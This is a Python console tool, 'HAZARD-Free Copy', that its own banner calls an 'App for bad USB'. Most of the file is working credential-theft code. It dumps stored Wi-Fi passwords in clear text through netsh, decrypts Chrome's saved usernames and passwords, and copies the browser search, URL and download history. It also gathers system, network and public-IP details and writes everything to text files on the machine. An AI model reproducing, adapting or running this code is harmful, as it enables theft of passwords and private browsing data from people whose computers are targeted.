#HaZaRd

#imported Library
import sys
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
import base64
from datetime import datetime, timedelta
import subprocess
import os
import re
import json
import win32crypt
import sqlite3 
import shutil
import requests
import datetime
import ctypes
import pyperclip
import getpass
from rich import *
from rich.progress import Progress
from time import *
from random import *
from pystyle import Colors,Write
from rich.console import Console
from rich.highlighter import Highlighter
from base64 import b64decode
from Crypto.Cipher import AES
from json import loads
import argparse
import argparse



console = Console()

# Set the title of the console window
while True:
 #Appearance menu
 os.system('cmd /c "cls"')
 ctypes.windll.kernel32.SetConsoleTitleW("HAZARD-Free Copy 1.2")
 
 print("                                                         v 1.2")
 print("                                    [green]██╗  ██╗ █████╗ ███████╗ █████╗ ██████╗ ██████╗                     [/green][yellow]For[/yellow] [green]My[/green] [red]People")
 print(" [green]free copy![/green]                         [green]██║  ██║██╔══██╗╚══███╔╝██╔══██╗██╔══██╗██╔══██╗              ")
 print(" [green]created by:[/green] [yellow]HaZaRd#4058[/yellow][white]            ███████║███████║  ██[/white][yellow]█╔╝ █████[/yellow][white]██║██████╔╝██║  ██║  " )
 print(" [red]App for bad USB![/red][white]                   ██╔══██║██╔══██║ ███[/white][yellow]╔╝  ██╔[/yellow][white]══██║██╔══██╗██║  ██║")
 print("                                    [red]██║  ██║██║  ██║███████╗██║  ██║██║  ██║██████╔╝")
 print("                                    [red]╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ")



 class RainbowHighlighter(Highlighter):
     def highlight(self, text):  
         for index in range(len(text)):
             text.stylize(f"color({randint(12, 255)})", index, index + 1)


 rainbow = RainbowHighlighter()
 print(rainbow("                                                      IRAN ON TOP!"))


 Write.Print("**free exit: ALT + F4**", Colors.blue_to_cyan, interval=0.02)

 print()
 Write.Print("------------------------------------------------------------------------------------------------------------------------\n", Colors.blue, interval=0.009)
 print("║[blue]01[/blue]║ : Copy Router Pass                                    ║[blue]09[/blue]║ : free all copy")
 print("║[blue]02[/blue]║ : Google Pass Copy                                    ║[blue]10[/blue]║ : Help")
 print("║[blue]03[/blue]║ : Google History Copy                                 ║[blue]11[/blue]║ : Discord")
 print("║[blue]04[/blue]║ : Copy Time & Loc                                     ║[red]12[/red]║ : Exit [red]*[/red]_[red]*[/red]")
 print("║[blue]05[/blue]║ : Windows Copy Information                            ")
 print("║[blue]06[/blue]║ : Ipconfig Copy                                 ")
 print("║[blue]07[/blue]║ : Make TxT File For Save                     ")
 print("║[blue]08[/blue]║ : Connect To Wifi                                  ")
 choice=input("--->")



    




 if choice == "1":
  try:
   print("\"ctrl + c\" at anytime to stop\n")
   ctypes.windll.kernel32.SetConsoleTitleW("HAZARD-Copy Router pas")
   netsh_output = subprocess.run(
      ["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()

   profile_names = (re.findall("All User Profile     : (.*)\r", netsh_output))

   wifi_list = []
 
   if len(profile_names) != 0:
      for name in profile_names:

         wifi_profile = {}

         profile_info = subprocess.run(
             ["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
         if re.search("Security key           : Absent", profile_info):
             continue
         else:
             wifi_profile["ssid"] = name
             profile_info_pass = subprocess.run(
                 ["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
             password = re.search(
                 "Key Content            : (.*)\r", profile_info_pass)
             if password == None:
                 wifi_profile["password"] = None
             else:
                 wifi_profile["password"] = password[1]

             wifi_list.append(wifi_profile)


      print(wifi_list)

   b= f"----hazard----pas c is ok:                                         {wifi_list}                                   godby god b/g\n"

   print("║[red]01[/red]║ : Save")
   print("║[red]02[/red]║ : Back to Menu")
   print("║[red]03[/red]║ : Exit")
   soe = input("--->")


 #   save a password in txt file
   if soe == "1":
    
     file = open("pas save.txt","w")
     file.write(b)
     file.close()
     print("[green]The save step went well[/green]")
     sleep(2)
   elif soe == "2":
     continue
   elif soe == "3":
     exit()   
   else:
     print("[red]The command is not defined[/red]")
  except KeyboardInterrupt:
   print("OK, my friend, I [red]stopped[/red]")
   sleep(1) 
   


 elif choice == "2":


  def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

  def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

  def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

  def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")

    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

    output_text = ""

    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            output_text += f"Origin URL: {origin_url} \n"
            output_text += f"Action URL: {action_url} \n"
            output_text += f"Username: {username} \n"
            output_text += f"Password: {password} \n"
            if date_created != 86400000000 and date_created:
                output_text += f"date gen: {str(get_chrome_datetime(date_created))} \n"
            if date_last_used != 86400000000 and date_last_used:
                output_text += f"last use: {str(get_chrome_datetime(date_last_used))} \n"
            output_text += "="*50 + "\n"

    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass


    output_file_name = "output.txt"


    print(output_text)


    print("║[red]01[/red]║ : Save")
    print("║[red]02[/red]║ : Back to Menu")
    print("║[red]03[/red]║ : Exit")
    soe = input("--->")
    if soe == "1":
        write_output_to_file(output_text, output_file_name)
    elif soe == "2":
     pass
    elif soe == "3":
        exit()
  def write_output_to_file(output_text, filename):
    with open(filename, "w", encoding="utf-8") as f:
        f.write(output_text)

  if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Show cookie googel")
    args = parser.parse_args()

    main()



 elif choice == "3":
  try:
   print("\"ctrl + c\" at anytime to stop\n")
   ctypes.windll.kernel32.SetConsoleTitleW("HAZARD-Googel History Copy")
   if os.system("uname > /dev/null") == 0 : # OS IS LINUX
     db_path = os.getenv("HOME") + "/.config/google-chrome/Default/History"
   else : # OS IS WINDOWS
     appdata = os.getenv("appdata").replace("\\Roaming","")
     db_path = appdata + "\\Local\\Google\\Chrome\\User Data\\Default\\History"

   db = sqlite3.connect(db_path)
   c = db.cursor()

 # SEARCH History
   searchs = []
   c.execute("select term from keyword_search_terms")
   for item in c.fetchall():
     searchs.append(item[0])

 # URL HISTORY
   urls = []
   c.execute("select url from urls")
   for item in c.fetchall():
      urls.append(item[0])

 # Download HISTORY :
   downloads = []
   c.execute("select tab_url from downloads")
   for item in c.fetchall():
     downloads.append(item[0])

 ## SHOW Information ##
   print("Urls : ")
   for url in urls:
     print("\t{}".format(url))

   print("-"*50)

   print("Downloaded Files :")
   for download in downloads:
     print("\t{}".format(download))
 
   print("-"*50)

   print("Searchs : ")
   for search in searchs:
     print("\t{}".format(search))
     sleep(10)
  except KeyboardInterrupt:
   print("OK, my friend, I [red]stopped[/red]")
   sleep(1)    
 elif choice == "4":
  try:
   print("\"ctrl + c\" at anytime to stop\n")
   ctypes.windll.kernel32.SetConsoleTitleW("HAZARD-Copy Time and loc")
   current_time = datetime.datetime.now()
   req = loads(requests.get('https://api.country.is/').content)
   country = req['country']
   ip = req['ip']
   print(f"IP : {ip} Country : {country} Time : {current_time}")
   ict = (f"IP : {ip} Country : {country} Time : {current_time}")
   print("║[red]01[/red]║ : Save")
   print("║[red]02[/red]║ : Back to Menu")
   print("║[red]03[/red]║ : Exit")
   soe = input("--->")
   if soe == "1":
      file = open("ICT.txt","w")
      file.write(ict)
      file.close()
      print("[green]The save step went well[/green]")
   elif soe == "2":
     continue
   elif soe == "3":
     exit()    
   else:
     print("[red]The command is not defined[/red]")
  except KeyboardInterrupt:
   print("OK, my friend, I [red]stopped[/red]")
   sleep(1)
  except TimeoutError:
    print("Time Out Error! Check the internet")  

 #windows copy information
 elif choice == "5":
  try:
   print("\"ctrl + c\" at anytime to stop\n")
 #set code in cmd or shell
   command_one = "SystemInfo"
   sys = subprocess.check_output(command_one).decode()
 #print info
   print(f"[yellow]{sys}")

   print("║[red]01[/red]║ : Save")
   print("║[red]02[/red]║ : Back to Menu")
   print("║[red]03[/red]║ : Exit")
   soe = input("--->")
 #save a info in txt file
   if soe == "1":
      file = open("sysinfo.txt","w")
      file.write(sys)
      file.close()
      print("[green]The save step went well[/green]")
      sleep(0.5)
   elif soe == "2":
     continue
   elif soe == "3":
     exit()
   else:
     print("[red]The command is not defined[/red]")
  except KeyboardInterrupt:
   print("OK, my friend, I [red]stopped[/red]")
   sleep(1)


 #ipconfig copy -- Copy network card information
 elif choice == "6":
 #set a cammand in cmd or shell(ipconfig)
  try:
     print("\"ctrl + c\" at anytime to stop\n")
     ipsc = subprocess.check_output("ipconfig").decode()
     print(ipsc)
     print("║[red]01[/red]║ : Save")
     print("║[red]02[/red]║ : Back to Menu")
     print("║[red]03[/red]║ : Exit")
     soe = input("--->")
 #save a info in txt file
     if soe == "1":
         file = open("ipsave.txt","w")
         file.write(ipsc)
         file.close()
         print("[green]The save step went well[/green]")
     elif soe == "2":
      continue
     elif soe == "3":
       exit()
     else:
        print("[red]The command is not defined[/red]")
  except KeyboardInterrupt:
   print("OK, my friend, I [red]stopped[/red]")
   sleep(1)

 #make a text file for save
 elif choice == "7": 
     file = open("pas save.txt","x")
   


  #connect to wifi
 elif choice == "8":
 #set a command in cmd or shell(netsh wlan show networks)
  os.system('cmd /c "netsh wlan show networks"')
 #Get the desired Wi-Fi name
  name_of_router = input('name wifi --->')
 #set a command in cmd or shell(netsh wlan connect name="wifi name")
  os.system(f'''cmd /c "netsh wlan connect name="{name_of_router}"''')
  print("[green]connected[/green]")
  sleep(0.1)
 


 #free all copy
 #We have included all parts of the program in this section
 elif choice == "9":

  try:
   print("\"ctrl + c\" at anytime to stop\n")

   with Progress() as progress:

     task1 = progress.add_task("[red]Run...", total=100)

     while not progress.finished:
         progress.update(task1, advance=0.5)

         sleep(0.02)

   netsh_output = subprocess.run(
      ["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
 
   profile_names = (re.findall("All User Profile     : (.*)\r", netsh_output))

   wifi_list = []

   if len(profile_names) != 0:
      for name in profile_names:

         wifi_profile = {}

         profile_info = subprocess.run(
             ["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
         if re.search("Security key           : Absent", profile_info):
             continue
         else:
             wifi_profile["ssid"] = name
             profile_info_pass = subprocess.run(
                 ["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
             password = re.search(
                 "Key Content            : (.*)\r", profile_info_pass)
             if password == None:
                 wifi_profile["password"] = None
             else:
                 wifi_profile["password"] = password[1]

             wifi_list.append(wifi_profile)
   b= f"pas c is ok:                                         {wifi_list}                                  HaZaRd godby god b/g\n" 
   print("[green]wifi is save")
   ipsc = subprocess.check_output("ipconfig").decode()
   sp = "\n"
   print("[green]ipconfig is save")
   command_one = "SystemInfo"
   sys = subprocess.check_output(command_one).decode()

   print("[green]sys info is save")
  
   current_time = datetime.datetime.now()
   req = loads(requests.get('https://api.country.is/').content)
   country = req['country']
   ip = req['ip']
   ict = (f"IP : {ip} Country : {country} Time : {current_time}")
   print("[green]Time & loc is save")
   

        

      
   file = open("all save.txt","w")
   file.write(b+ipsc+sp+sys+sp+ict+sp)
   file.close()
   print("[blue]all save!")
   sleep(0.5)
  except KeyboardInterrupt:
   print("OK, my friend, I [red]stopped[/red]")
   sleep(1)  
 elif choice == "10":
    os.system("cls")
    os.system("python Help.py")
 elif choice == "11":
    print("[green]Discord:[/green] [red]https://discord.gg/xbN3XSHYjxp[/red]")
    console.print(" Save To Clipboard! ", style="green on white")
    pyperclip.copy("https://discord.gg/xbN3XSHYjxp")
    sleep(3)
 elif choice == "12":
    exit()
 else:
    print("[red]The command is not defined[/red]")




#discord





#  __    __  ______  ________  ______  _______  _______  
# |  \  |  \/      \|        \/      \|       \|       \ 
# | ▓▓  | ▓▓  ▓▓▓▓▓▓\\▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓\ ▓▓▓▓▓▓▓\ ▓▓▓▓▓▓▓\
# | ▓▓__| ▓▓ ▓▓__| ▓▓   /  ▓▓| ▓▓__| ▓▓ ▓▓__| ▓▓ ▓▓  | ▓▓
# | ▓▓    ▓▓ ▓▓    ▓▓  /  ▓▓ | ▓▓    ▓▓ ▓▓    ▓▓ ▓▓  | ▓▓
# | ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓ /  ▓▓  | ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓\ ▓▓  | ▓▓
# | ▓▓  | ▓▓ ▓▓  | ▓▓/  ▓▓___| ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓__/ ▓▓
# | ▓▓  | ▓▓ ▓▓  | ▓▓  ▓▓    \ ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓    ▓▓    
#  \▓▓   \▓▓\▓▓   \▓▓\▓▓▓▓▓▓▓▓\▓▓   \▓▓\▓▓   \▓▓\▓▓▓▓▓▓▓ 
                                                       
                                                       
                                                       
# ───▄█▌─▄─▄─▐█▄
# ───██▌▀▀▄▀▀▐██
# ───██▌─▄▄▄─▐██
# ───▀██▌▐█▌▐██▀
# ▄██████─▀─██████▄
